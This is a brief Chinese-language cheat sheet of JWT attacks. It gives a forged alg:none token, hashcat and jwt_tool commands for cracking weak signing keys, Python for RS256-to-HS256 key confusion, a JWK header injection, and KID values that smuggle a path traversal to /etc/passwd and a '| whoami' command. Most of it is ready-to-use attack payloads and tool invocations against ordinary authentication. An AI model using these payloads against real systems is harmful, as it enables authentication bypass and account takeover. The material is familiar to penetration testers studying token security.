# JWT 攻击

## 结构
```
header.payload.signature
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"123","name":"admin","iat":1516239022,"exp":1516242622}
```

## alg: none
将 alg 改为 none，跳过签名验证
```
eyJhbGciOiAibm9uZSJ9.eyJhZG1pbiI6dHJ1ZX0.
```

## 弱密钥爆破
```bash
hashcat -m 16500 jwt.txt wordlist.txt
python3 jwt_tool.py -C -d wordlist.txt token
```

## RS256 → HS256 混淆
得到公钥后，用公钥做 HMAC 密钥签名
```python
import jwt
token = jwt.encode(payload, public_key, algorithm="HS256")
```

## JWK 注入
在 header 中嵌入攻击者控制的公钥
```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

## KID 注入
```json
{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}
{"alg":"HS256","typ":"JWT","kid":"| whoami"}
```

## 工具
```bash
# jwt_tool
python3 jwt_tool.py <token> -T           # 修改payload
python3 jwt_tool.py <token> -X a         # none攻击
python3 jwt_tool.py <token> -X k         # 密钥混淆

# jwt.io — 在线调试
```
